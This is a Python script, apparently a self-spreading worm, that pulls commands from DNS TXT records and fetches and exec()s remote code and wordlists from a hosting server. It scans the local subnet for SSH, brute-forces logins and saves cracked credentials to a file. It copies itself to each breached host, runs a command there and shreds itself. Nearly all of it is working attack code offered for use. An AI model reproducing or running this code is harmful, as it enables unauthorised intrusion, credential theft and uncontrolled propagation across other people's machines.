#!/usr/bin/python3
"""
# Uses the response from dns requests to load user & password list into memory for brute-forcing.
# It also loads a method from an externally hosted source.
# It runs from Linux as well as Windows and is able to authenticate to both systems via ssh, as long it is
# available and/or enabled on the target.
# It utilises the strings at the beginning of each entry (win_1: & lin_1:) to
# load a method from "get_own_ip.py" to determine the local IP.

==> Needed infrastructure:
--> 2 Domains with TXT entries:

-> lin.dom.com:
lin_1: curl -s 'http://192.168.10.25/get_own_ip.py'
lin_2: curl -s 'http://192.168.10.25/users.txt'
lin_3: curl -s 'http://192.168.10.25/pass.txt'
-> win.dom.com:
win_1: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/get_own_ip.py').Content
win_2: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/users.txt').Content
win_3: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/pass.txt').Content

-> Server (hosting 'get_own_ip.py'):

-> get_own_ip.py:
import psutil
import socket

class ExtClass:

    def get_own_ip(self):
        addrs = psutil.net_if_addrs()

        for interface, addrs_list in addrs.items():
            for addr in addrs_list:
                if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                    ip_address = addr.address
                    return ip_address

        print("No valid IP address found.")

ext_class_instance = ExtClass()
ext_class_instance.get_own_ip()

# According to the host operating system (Linux/Windows) the wrm is running on,
# it differentiates which domain to contact to get the right commands to run.
# It uses an externally hosted python class to determine the current subnet
# to scan for alive hosts and populate itself further.
"""

import paramiko
import socket
import sys
import ipaddress
import subprocess
import platform
import time
from os import path
import dns.resolver
from scp import SCPClient

myself = sys.argv[0]

class TheBuster:

    IS_WINDOWS = platform.system() == "Windows"

    # --------------------------------------------------------------------------------------

    def __init__(self):

        self.ext_class_instance = None
        self.gateway = None
        self.win_1_cmd = None
        self.win_2_cmd = None
        self.win_3_cmd = None
        self.lin_1_cmd = None
        self.lin_2_cmd = None
        self.lin_3_cmd = None

    # --------------------------------------------------------------------------------------

    def get_default_gateway(self):

        if self.IS_WINDOWS:

            result = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, text=True)

            for line in result.stdout.splitlines():

                if "Default Gateway" in line:
                    self.gateway = line.split(":")[1].strip()
                    break

        else:
            result = subprocess.run(['ip', 'route'], stdout=subprocess.PIPE, text=True)

            for line in result.stdout.splitlines():

                if "default via" in line:
                    self.gateway = line.split()[2]
                    break

        return self.gateway

    # --------------------------------------------------------------------------------------

    def is_host_reachable(self, ipaddr):

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ipaddr, 22))
            sock.close()
            return result == 0

        except socket.error:
            return False

    # --------------------------------------------------------------------------------------

    def ext_function(self, ext_cmd):

        try:
            result = subprocess.run(ext_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            script_content = result.stdout

            if not script_content:
                print("Error: No content fetched from the command.")
                return

            exec_globals = {}
            exec(script_content, exec_globals)

            class_name = 'ExtClass'
            method_name = 'get_own_ip'

            if class_name in exec_globals and hasattr(exec_globals[class_name], method_name):
                self.ext_class_instance = exec_globals[class_name]()

            else:
                print(f"Error: Class '{class_name}' or method '{method_name}' not found in the fetched script content.")

        except Exception as e:
            print(f"An error occurred: {e}")

    # --------------------------------------------------------------------------------------

    def discern(self):

        if self.IS_WINDOWS:
            txt_records = dns.resolver.resolve('win.dom.com', 'TXT')

        else:
            txt_records = dns.resolver.resolve('lin.dom.com', 'TXT')

        for txt_record in txt_records:

            text = txt_record.to_text()
            entries = text.split('"')

            for entry in entries:

                entry = entry.strip()

                if entry:
                    if entry.startswith("win_1: "):
                        self.win_1_cmd = entry.split(": ", 1)[1]

                    elif entry.startswith("win_2: "):
                        self.win_2_cmd = entry.split(": ", 1)[1]

                    elif entry.startswith("win_3: "):
                        self.win_3_cmd = entry.split(": ", 1)[1]

                    elif entry.startswith("lin_1: "):
                        self.lin_1_cmd = entry.split(": ", 1)[1]

                    elif entry.startswith("lin_2: "):
                        self.lin_2_cmd = entry.split(": ", 1)[1]

                    elif entry.startswith("lin_3: "):
                        self.lin_3_cmd = entry.split(": ", 1)[1]

        if self.IS_WINDOWS:

            if self.win_1_cmd:
                return self.win_1_cmd

            if self.win_2_cmd:
                 return self.win_2_cmd

            if self.win_3_cmd:
                return self.win_3_cmd
        else:

            if self.lin_1_cmd:
                return self.lin_1_cmd

            if self.lin_2_cmd:
                return self.lin_2_cmd

            if self.lin_3_cmd:
                return self.lin_3_cmd

    # --------------------------------------------------------------------------------------

    def ping_stuff(self):

        ext_cmd = self.discern()

        if ext_cmd:

            self.ext_function(ext_cmd)

        own_ip = self.ext_class_instance.get_own_ip() if self.ext_class_instance else None
        gateway = self.get_default_gateway()

        if not own_ip or not gateway:

            print("Could not determine network details. Exiting.")
            sys.exit(1)

        first, middle_1, middle_2, _ = own_ip.split('.')
        subnet = f"{first}.{middle_1}.{middle_2}.0/24"
        print(f"Scanning network: {subnet}")

        ip = ipaddress.ip_network(subnet, strict=False)
        alive_hosts = []

        for i in ip.hosts():

            i = str(i)

            if self.IS_WINDOWS:
                toping = subprocess.run(['powershell.exe', '-Command', f'Test-Connection -ComputerName {i} -Count 1 -Quiet'], capture_output=True, text=True)
                is_alive = toping.stdout.strip() == "True"

            else:
                toping = subprocess.run(['ping', '-c', '1', i], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                is_alive = "1 received" in toping.stdout

            if is_alive:

                if i == gateway:
                    print(i + " ==> GATEWAY")
                    continue

                elif i == own_ip:
                    print(i + " ==> OWN IP")
                    continue

                print(i, 'is reachable')
                alive_hosts.append(i)
            else:
                print(i, 'is down')

        return alive_hosts

    # --------------------------------------------------------------------------------------

    def brute_stuff(self):

        self.discern()

        if self.IS_WINDOWS:
            userlist = self.win_2_cmd
            passlist = self.win_3_cmd

        else:
            userlist = self.lin_2_cmd
            passlist = self.lin_3_cmd

        if not userlist or not passlist:
            print("[!] User or password list is empty. Ensure TXT records resolve correctly.")
            return

        try:
            userlist = subprocess.check_output(userlist, shell=True, text=True).splitlines()
            passlist = subprocess.check_output(passlist, shell=True, text=True).splitlines()

        except subprocess.CalledProcessError as e:
            print(f"[!] Error executing command: {e}")
            return

        alive_hosts = self.ping_stuff()

        for target in alive_hosts:
            print(f"[*] Trying {target}")

            if not self.is_host_reachable(target):
                print(f"[!] Host {target} is unreachable. Skipping to next IP.")
                continue

            found_valid_credentials = False

            for username in userlist:

                for password in passlist:

                    if not self.is_ssh_open(target, username, password):
                        continue

                    with open("creds.txt", "a") as cred_file:
                        cred_file.write(f"{username}@{target}:{password}\n")

                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(hostname=target, username=username, password=password)

                    scp = SCPClient(client.get_transport())
                    print(f"\nConnecting to {target} and executing first stage")
                    scp.put(f'{myself}')

                    print("Connected to target and executing 'some stuff'..\n")
                    client.exec_command('echo "Got first base.." > gotcha.txt')

                    found_valid_credentials = True
                    break

                if found_valid_credentials:
                    break

    # --------------------------------------------------------------------------------------

    def is_ssh_open(self, ipaddr, username, password):

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(hostname=ipaddr, username=username, password=password, timeout=5)

        except socket.timeout:
            print(f"[!] Host: {ipaddr} is unreachable, timed out.")
            return False

        except paramiko.AuthenticationException:
            print(f"[!] Invalid credentials for {ipaddr} <=> {username}:{password}")
            return False

        except paramiko.SSHException:
            print("[*] Quota exceeded, retrying with delay...")
            time.sleep(60)
            return self.is_ssh_open(ipaddr, username, password)

        else:
            print(f"[+] Found combo: {username}@{ipaddr}:{password}")
            return True

        finally:
            client.close()

    # --------------------------------------------------------------------------------------

    def secure_delete(self):

        self_path = path.abspath(__file__)

        if self.IS_WINDOWS:
            print("[*] Deleting script using PowerShell `Remove-Item`")
            subprocess.run(["powershell.exe", "Remove-Item", "-Path", self_path, "-Force"], shell=True)
        else:
            print("[*] Deleting script using `shred` (Linux)")
            subprocess.run(["shred", "-fuz", self_path], shell=True)

# --------------------------------------------------------------------------------------

if __name__ == '__main__':
    a = TheBuster()
    a.brute_stuff()
    a.secure_delete()
